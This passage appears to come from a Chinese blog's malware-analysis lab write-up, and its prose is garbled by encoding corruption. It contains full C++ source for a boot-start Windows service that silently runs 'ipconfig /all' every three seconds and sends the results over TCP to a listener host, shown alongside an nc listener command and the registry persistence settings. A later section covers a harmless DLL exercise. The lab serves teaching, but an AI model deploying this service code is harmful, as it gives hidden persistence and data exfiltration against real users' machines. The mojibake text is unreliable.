<p>å¯ä»¥åœ¨windowsæ³¨å†Œè¡¨(<code>regedit</code>)ä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥åœ¨æœåŠ¡æ§åˆ¶å°(<code>services.msc</code>)ä¸­æŸ¥çœ‹ã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/11.png" title="11" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/11.png" alt="11"></a></p>
<blockquote>
<p>æœåŠ¡æ³¨å†Œè¡¨ä½äºæ³¨å†Œè¡¨è·¯å¾„ <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\YourServiceName</code> ä¸‹ï¼Œå…¶ä¸­ <code>YourServiceName</code> æ˜¯ä½ çš„æœåŠ¡çš„åç§°ã€‚</p>
</blockquote>
<p>åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­ï¼ŒæœåŠ¡æ³¨å†Œè¡¨ä¸­çš„ <code>ImagePath</code> æ˜¯æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ã€‚è¯¥æ³¨å†Œè¡¨é¡¹æŒ‡å®šäº†æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®ã€‚å½“æœåŠ¡è¢«å¯åŠ¨æ—¶ï¼Œç³»ç»Ÿå°†åŠ è½½è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„æœåŠ¡ä»£ç ã€‚</p>
<p><code>Start</code>çš„å€¼ä¸º2ï¼Œè¡¨ç¤ºè¯¥æœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ã€‚</p>
<p><strong>ä½†æ˜¯è‡ªå¯åŠ¨æœåŠ¡ç¨‹åºå¹¶ä¸æ˜¯æ™®é€šçš„ç¨‹åºï¼Œè€Œæ˜¯è¦æ±‚ç¨‹åºåˆ›å»ºæœåŠ¡å…¥å£ç‚¹å‡½æ•°ï¼Œå¦åˆ™ï¼Œä¸èƒ½å¯åŠ¨ç³»ç»ŸæœåŠ¡ã€‚</strong></p>
<p>myservice.cppä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 1024</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS        g_ServiceStatus = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">SERVICE_STATUS_HANDLE g_StatusHandle = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="comment">// å®ç°é€šè¿‡tcpè¿æ¥å‘192.168.65.1çš„12345ç«¯å£å‘é€&#x27;ipconfig /all&#x27;çš„æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *host,<span class="type">int</span> port)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    SOCKET ShellSock;</span><br><span class="line">    sockaddr_in C2addr;</span><br><span class="line"></span><br><span class="line">    WSADATA Sockver = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;Sockver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">    ShellSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®æœåŠ¡å™¨åœ°å€</span></span><br><span class="line">    C2addr.sin_family = AF_INET;</span><br><span class="line">    C2addr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(host);</span><br><span class="line">    C2addr.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAConnect</span>(ShellSock, (SOCKADDR*)&amp;C2addr, <span class="built_in">sizeof</span>(C2addr), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        HANDLE hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line">        SECURITY_ATTRIBUTES securityAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        BOOL bRet = FALSE;</span><br><span class="line">        STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> command[DEFAULT_BUFLEN];</span><br><span class="line">        PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> pszResultBuffer[DEFAULT_BUFLEN];</span><br><span class="line"></span><br><span class="line">        securityAttributes.bInheritHandle = TRUE;</span><br><span class="line">        securityAttributes.nLength = <span class="built_in">sizeof</span>(securityAttributes);</span><br><span class="line">        securityAttributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        bRet = <span class="built_in">CreatePipe</span>(&amp;hReadPipe, &amp;hWritePipe, &amp;securityAttributes, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bRet || hReadPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();  </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">        si.hStdError = hWritePipe;</span><br><span class="line">        si.hStdOutput = hWritePipe;</span><br><span class="line">        si.wShowWindow = SW_HIDE;</span><br><span class="line">        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ å‘½ä»¤</span></span><br><span class="line">        <span class="built_in">strcpy</span>(command, <span class="string">&quot;cmd.exe /c &quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(command, <span class="string">&quot;ipconfig /all&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bRet = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, command, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);</span><br><span class="line">        <span class="built_in">memset</span>(pszResultBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(pszResultBuffer));</span><br><span class="line">        <span class="comment">// è¯»å–å­è¿›ç¨‹çš„è¾“å‡º</span></span><br><span class="line">        DWORD bytesRead;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, &amp;bytesRead, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="comment">// å‘é€è¾“å‡ºåˆ°å¥—æ¥å­—</span></span><br><span class="line">        <span class="built_in">send</span>(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// å…³é—­å¥—æ¥å­—</span></span><br><span class="line">        <span class="built_in">closesocket</span>(ShellSock);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯¥æœåŠ¡å®ç°äº†ï¼Œæ¯ä¸‰ç§’å‘è¿œæ–¹ä¸»æœºå‘é€&#x27;ipconfig /all&#x27;çš„æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StartServiceWork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">WaitForSingleObject</span>(g_ServiceStopEvent, <span class="number">0</span>) != WAIT_OBJECT_0) &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œæ”¾ç½®ä½ çš„æœåŠ¡å·¥ä½œé€»è¾‘</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* host = <span class="string">&quot;192.168.65.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port = <span class="number">12345</span>;</span><br><span class="line">        <span class="built_in">cmd</span>(host,port);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">ServiceCtrlHandler</span><span class="params">(DWORD CtrlCode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (CtrlCode == SERVICE_CONTROL_STOP) &#123;</span><br><span class="line">        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;</span><br><span class="line">        <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">SetEvent</span>(g_ServiceStopEvent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">ServiceMain</span><span class="params">(DWORD argc, LPTSTR *argv)</span> </span>&#123;</span><br><span class="line">    g_StatusHandle = <span class="built_in">RegisterServiceCtrlHandler</span>(<span class="string">&quot;myservice&quot;</span>, ServiceCtrlHandler);</span><br><span class="line"></span><br><span class="line">    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">    g_ServiceStopEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;</span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">StartServiceWork</span>();</span><br><span class="line"></span><br><span class="line">    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">    <span class="built_in">SetServiceStatus</span>(g_StatusHandle, &amp;g_ServiceStatus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> name []= <span class="string">&quot;myservice&quot;</span>;</span><br><span class="line">    SERVICE_TABLE_ENTRY ServiceTable[] = &#123;</span><br><span class="line">        &#123; name, (LPSERVICE_MAIN_FUNCTION)ServiceMain&#125;,</span><br><span class="line">        &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">StartServiceCtrlDispatcher</span>(ServiceTable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>192.168.65.1ä¸»æœºæ˜¯ç”¨ncå¯¹12345ç«¯å£è¿›è¡Œç›‘å¬:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -Lvvp 12345</span><br></pre></td></tr></table></figure>

<p><a href="/../img/Malware-Analysis-Practice2/12.png" title="12" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/12.png" alt="12"></a></p>
<p>è¿è¡Œäº†æœåŠ¡çš„è™šæ‹Ÿæœºï¼š</p>
<p><a href="/../img/Malware-Analysis-Practice2/13.png" title="13" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/13.png" alt="13"></a></p>
<blockquote>
<p>æ³¨ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System Process]	0	TCP	win-0r0scl2qm11.localdomain	49396	laptop-j2g20010	12345	TIME_WAIT</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>[System Process]</strong>: è¿™å¯èƒ½æ˜¯æŒ‡ç¤ºæ­¤TCPè¿æ¥æ‰€å±çš„è¿›ç¨‹åç§°ã€‚åœ¨è¿™é‡Œæ˜¯â€œSystem Processâ€ï¼Œè¡¨ç¤ºè¿™ä¸ªè¿æ¥ç”±ç³»ç»Ÿè¿›ç¨‹å¤„ç†ã€‚</li>
<li><strong>0</strong>: è¿™å¯èƒ½æ˜¯ä¸TCPè¿æ¥ç›¸å…³çš„è¿›ç¨‹IDï¼ˆPIDï¼‰ï¼Œä½†åœ¨è¿™ä¸ªæ–‡æœ¬ä¸­æ˜¾ç¤ºä¸º0ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºç³»ç»Ÿè¿›ç¨‹é€šå¸¸ä¸ä¸ç‰¹å®šçš„ç”¨æˆ·çº§è¿›ç¨‹å…³è”ã€‚</li>
<li><strong>TCP</strong>: è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªTCPè¿æ¥ã€‚</li>
<li><strong>win-0r0scl2qm11.localdomain</strong>: æ˜¯æœ¬åœ°ä¸»æœºçš„åç§°æˆ–æ ‡è¯†ã€‚</li>
<li><strong>49396</strong>: æ˜¯æœ¬åœ°ä¸»æœºçš„ç«¯å£å·ã€‚</li>
<li><strong>laptop-j2g20010</strong>: æ˜¯è¿œç¨‹ä¸»æœºçš„åç§°æˆ–æ ‡è¯†ã€‚</li>
<li><strong>12345</strong>: æ˜¯è¿œç¨‹ä¸»æœºçš„ç«¯å£å·ã€‚</li>
<li><strong>TIME_WAIT</strong>: æ˜¯è¿æ¥çŠ¶æ€ï¼Œè¡¨ç¤ºè¿æ¥å·²ç»å…³é—­ï¼Œä½†åœ¨ç­‰å¾…ä¸€æ®µæ—¶é—´åå°†è¢«ç³»ç»Ÿé‡Šæ”¾ã€‚</li>
</ul>
</blockquote>
<h5 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TJTO/p/13216616.html">https://www.cnblogs.com/TJTO/p/13216616.html</a></p>
<h2 id="DLLæ–‡ä»¶ç¼–å†™"><a href="#DLLæ–‡ä»¶ç¼–å†™" class="headerlink" title="DLLæ–‡ä»¶ç¼–å†™"></a>DLLæ–‡ä»¶ç¼–å†™</h2><h3 id="å®éªŒè¦æ±‚-1"><a href="#å®éªŒè¦æ±‚-1" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><p>ç¼–å†™ä¸€ä¸ªDLLï¼Œä½¿å¾—åœ¨åŠ¨æ€åŠ è½½è¯¥DLLæ—¶ï¼Œèƒ½å¤Ÿå¼¹å‡ºâ€œç›®æ ‡DLLå·²åŠ è½½â€çš„å¯¹è¯æ¡†ã€‚åŒæ—¶ï¼Œä¸ºDLLæ·»åŠ ä¸¤ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œåˆ†åˆ«å®ç°è¯»å–æ–‡ä»¶å¹¶æ‰“å°å‡ºæ¥ï¼Œä»¥åŠå†™å…¥æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«å…¶ä»–ç¨‹åºåŠ¨æ€è°ƒç”¨ã€‚</p>
<h3 id="å®éªŒç¯å¢ƒ-1"><a href="#å®éªŒç¯å¢ƒ-1" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul>
<li><p>Windows 7æˆ–Windows 10ä¸»æœºï¼ˆè™šæ‹Ÿæœºï¼‰ï¼›</p>
</li>
<li><p>ä»£ç ç¼–è¾‘å™¨ï¼›</p>
</li>
<li><p>C&#x2F;C++ä»£ç è¿è¡Œæ‰€éœ€ç¯å¢ƒã€‚</p>
</li>
</ul>
<h3 id="å®éªŒç›®çš„-1"><a href="#å®éªŒç›®çš„-1" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h3><p>äº†è§£DLLçš„ä½œç”¨å’Œè°ƒç”¨å…¶å‡½æ•°çš„æ–¹æ³•ã€‚</p>
<h3 id="å®éªŒæ­¥éª¤-1"><a href="#å®éªŒæ­¥éª¤-1" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><h5 id="ç”ŸæˆDLLæ–‡ä»¶"><a href="#ç”ŸæˆDLLæ–‡ä»¶" class="headerlink" title="ç”ŸæˆDLLæ–‡ä»¶"></a>ç”Ÿæˆ<code>DLL</code>æ–‡ä»¶</h5><p>ç¼–å†™task2.cppï¼Œè¿™æ®µä»£ç æ˜¯ä¸€ä¸ª DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰çš„ä¸»å…¥å£å‡½æ•° <code>DllMain</code>ï¼Œä»¥åŠä¸‰ä¸ªå¯¼å‡ºå‡½æ•° <code>function_1</code>ã€<code>ReadAndPrintFile</code>ã€<code>WriteToFile</code>ã€‚</p>
<ul>
<li><code>DllMain</code> æ˜¯ DLL çš„ä¸»å…¥å£å‡½æ•°ï¼Œå®ƒåœ¨ä¸åŒçš„æƒ…å†µä¸‹è¢«è°ƒç”¨ï¼Œæ ¹æ® <code>ul_reason_for_call</code> å‚æ•°çš„ä¸åŒå€¼ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</li>
</ul>
<p>task2.cppä¸­çš„<code>DLLMain</code>å‡½æ•°åœ¨æ¯ä¸€æ¬¡è¢«è°ƒç”¨åéƒ½ä¼šé€šè¿‡<code>MessageBoxW</code>å‡½æ•°æç¤ºå½“å‰çš„<code>ul_reason_for_cal</code>ã€‚</p>
<blockquote>
<p>å‚æ•°æ„ä¹‰:</p>
<p>â‘ <code>hModule</code>å‚æ•°ï¼šæŒ‡å‘DLLæœ¬èº«çš„å®ä¾‹å¥æŸ„ï¼› </p>
<p>â‘¡<code>ul_reason_for_call</code>å‚æ•°ï¼šæŒ‡æ˜äº†DLLè¢«è°ƒç”¨çš„åŸå› ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹4ä¸ªå–å€¼ï¼š</p>
<ol>
<li><strong>DLL_PROCESS_ATTACHï¼šè¿›ç¨‹æ˜ å°„</strong></li>
</ol>
<p>å½“DLLè¢«è¿›ç¨‹ &lt;&lt;ç¬¬ä¸€æ¬¡&gt;&gt; è°ƒç”¨æ—¶ï¼Œå¯¼è‡´<code>DllMain</code>å‡½æ•°è¢«è°ƒç”¨ï¼ŒåŒæ—¶<code>ul_reason_for_call</code>çš„å€¼ä¸º<code>DLL_PROCESS_ATTACH</code>ï¼Œå¦‚æœåŒä¸€ä¸ªè¿›ç¨‹åæ¥å†æ¬¡è°ƒç”¨æ­¤DLLæ—¶ï¼Œæ“ä½œç³»ç»Ÿåªä¼šå¢åŠ DLLçš„ä½¿ç”¨æ¬¡æ•°ï¼Œä¸ä¼šå†ç”¨<code>DLL_PROCESS_ATTACH</code>è°ƒç”¨DLLçš„<code>DllMain</code>å‡½æ•°ã€‚</p>
<ol start="2">
<li><strong>DLL_PROCESS_DETACHï¼šè¿›ç¨‹å¸è½½</strong></li>
</ol>
<p>å½“DLLè¢«ä»è¿›ç¨‹çš„åœ°å€ç©ºé—´è§£é™¤æ˜ å°„æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨äº†å®ƒçš„<code>DllMain</code>ï¼Œä¼ é€’çš„<code>ul_reason_for_call</code>å€¼æ˜¯<code>DLL_PROCESS_DETACH</code>ã€‚</p>
<p>â˜…å¦‚æœè¿›ç¨‹çš„ç»ˆç»“æ˜¯å› ä¸ºè°ƒç”¨äº†<code>TerminateProcess</code>ï¼Œç³»ç»Ÿå°±ä¸ä¼šç”¨<code>DLL_PROCESS_DETACH</code>æ¥è°ƒç”¨DLLçš„<code>DllMain</code>å‡½æ•°ã€‚è¿™å°±æ„å‘³ç€DLLåœ¨è¿›ç¨‹ç»“æŸå‰æ²¡æœ‰æœºä¼šæ‰§è¡Œä»»ä½•æ¸…ç†å·¥ä½œã€‚</p>
<ol start="3">
<li><strong>DLL_THREAD_ATTACHï¼šçº¿ç¨‹æ˜ å°„</strong></li>
</ol>
<p>å½“è¿›ç¨‹åˆ›å»ºä¸€çº¿ç¨‹æ—¶ï¼Œç³»ç»ŸæŸ¥çœ‹å½“å‰æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„æ‰€æœ‰DLLæ–‡ä»¶æ˜ åƒï¼Œå¹¶ç”¨å€¼<code>DLL_THREAD_ATTACH</code>è°ƒç”¨DLLçš„<code>DllMain</code>å‡½æ•°ã€‚æ–°åˆ›å»ºçš„çº¿ç¨‹è´Ÿè´£æ‰§è¡Œè¿™æ¬¡çš„DLLçš„<code>DllMain</code>å‡½æ•°ï¼Œåªæœ‰å½“æ‰€æœ‰çš„DLLéƒ½å¤„ç†å®Œè¿™ä¸€é€šçŸ¥åï¼Œç³»ç»Ÿæ‰å…è®¸çº¿ç¨‹å¼€å§‹æ‰§è¡Œå®ƒçš„çº¿ç¨‹å‡½æ•°ã€‚</p>
<ol start="4">
<li><strong>DLL_THREAD_DETACHï¼šçº¿ç¨‹å¸è½½</strong></li>
</ol>
<p>å¦‚æœçº¿ç¨‹è°ƒç”¨äº†<code>ExitThread</code>æ¥ç»“æŸçº¿ç¨‹ï¼ˆçº¿ç¨‹å‡½æ•°è¿”å›æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨<code>ExitThread</code>ï¼‰ï¼Œç³»ç»ŸæŸ¥çœ‹å½“å‰æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ä¸­çš„æ‰€æœ‰DLLæ–‡ä»¶æ˜ åƒï¼Œå¹¶ç”¨<code>DLL_THREAD_DETACH</code>æ¥è°ƒç”¨<code>DllMain</code>å‡½æ•°ï¼Œé€šçŸ¥æ‰€æœ‰çš„DLLå»æ‰§è¡Œçº¿ç¨‹çº§çš„æ¸…ç†å·¥ä½œã€‚</p>
<p>â˜…æ³¨æ„ï¼šå¦‚æœçº¿ç¨‹çš„ç»“æŸæ˜¯å› ä¸ºç³»ç»Ÿä¸­çš„ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº†<code>TerminateThread</code>ï¼Œç³»ç»Ÿå°±ä¸ä¼šç”¨å€¼<code>DLL_THREAD_DETACH</code>æ¥è°ƒç”¨æ‰€æœ‰DLLçš„<code>DllMain</code>å‡½æ•°ã€‚</p>
<p>â‘¢<code>lpReserved</code>å‚æ•°ï¼šä¿ç•™ï¼Œç›®å‰æ²¡ä»€ä¹ˆæ„ä¹‰ã€‚</p>
</blockquote>
<ul>
<li><code>function_1</code>ï¼šä¸€ä¸ªç®€å•çš„å¼¹çª—æ˜¾ç¤ºæ¶ˆæ¯çš„å‡½æ•°ï¼Œé€šè¿‡ <code>MessageBoxW</code> å‡½æ•°æ˜¾ç¤ºä¸€ä¸ªåŒ…å« â€œHello, this is function_1â€ çš„æ¶ˆæ¯æ¡†ã€‚</li>
<li><code>ReadAndPrintFile</code>ï¼šè¯»å–æ–‡ä»¶å¹¶æ‰“å°å†…å®¹åˆ°æ ‡å‡†è¾“å‡ºã€‚å®ƒæ¥æ”¶ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‚æ•°ï¼Œå°è¯•ä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œå°†æ–‡ä»¶å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæµï¼ˆ<code>std::cout</code>ï¼‰ã€‚</li>
<li><code>WriteToFile</code>ï¼šå†™å…¥å†…å®¹åˆ°æ–‡ä»¶ä¸­ã€‚å®ƒæ¥æ”¶ä¸€ä¸ªæ–‡ä»¶åã€è¦å†™å…¥çš„å†…å®¹å’Œæ–‡ä»¶æ‰“å¼€æ¨¡å¼ä½œä¸ºå‚æ•°ã€‚æ‰“å¼€æ–‡ä»¶æ—¶ä½¿ç”¨äº†ä¼ å…¥çš„æ¨¡å¼ï¼Œå°†å†…å®¹å†™å…¥æ–‡ä»¶åå…³é—­æ–‡ä»¶ã€‚</li>
</ul>
